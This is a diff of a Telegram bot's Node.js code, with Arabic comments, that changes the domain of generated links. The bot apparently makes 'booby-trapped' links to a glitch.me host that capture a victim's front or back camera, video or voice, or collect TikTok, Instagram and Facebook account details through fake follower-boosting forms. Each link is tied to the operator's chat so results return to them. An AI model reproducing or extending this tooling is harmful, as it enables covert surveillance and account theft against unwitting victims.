@@ -771,26 +771,26 @@ bot.on('callback_query', async (callbackQuery) => {
 
         switch (action) {
             case 'captureFront':
-                link = `https://leather-marble-shrine.glitch.mecaptureFront/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+                link = `https://momentous-cooperative-periodical.glitch.me/captureFront/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                 break;
             case 'captureBack':
-                link = `https://leather-marble-shrine.glitch.me/captureBack/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+                link = `https://momentous-cooperative-periodical.glitch.me/captureBack/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                 break;
             case 'getvideo':
-                link = `https://leather-marble-shrine.glitch.me/getvideo/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+                link = `https://momentous-cooperative-periodical.glitch.me/getvideo/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                 break;
             case 'recordVoice':
                 const duration = 10;  // مدة التسجيل الثابتة
-                link = `https://leather-marble-shrine.glitch.me/recora/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
+                link = `https://momentous-cooperative-periodical.glitch.me/recora/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
                 break;
             case 'rshq_tiktok':
-                link = `https://leather-marble-shrine.glitch.me/getNameForm?chatId=${chatId}&type=tiktok`;
+                link = `https://momentous-cooperative-periodical.glitch.me/getNameForm?chatId=${chatId}&type=tiktok`;
                 break;
             case 'rshq_instagram':
-                link = `https://leather-marble-shrine.glitch.me/getNameForm?chatId=${chatId}&type=instagram`;
+                link = `https://momentous-cooperative-periodical.glitch.me/getNameForm?chatId=${chatId}&type=instagram`;
                 break;
             case 'rshq_facebook':
-                link = `https://leather-marble-shrine.glitch.me/getNameForm?chatId=${chatId}&type=facebook`;
+                link = `https://momentous-cooperative-periodical.glitch.me/getNameForm?chatId=${chatId}&type=facebook`;
                 break;
             default:
                 bot.sendMessage(chatId, '');
@@ -845,7 +845,7 @@ bot.on('callback_query', (query) => {
                     dataStore[chatId] = { userLink };
 
                     // إرسال الرابط المعدل للمستخدم
-                    bot.sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:\nhttps://i-jgne.onrender.com/capture.html?chatId=${chatId}`);
+                    bot.sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:\nhttps://momentous-cooperative-periodical.glitch.me/capture.html?chatId=${chatId}`);
 
                     // إزالة مستمع الرسائل بعد المعالجة
                     bot.removeListener('message', messageHandler);
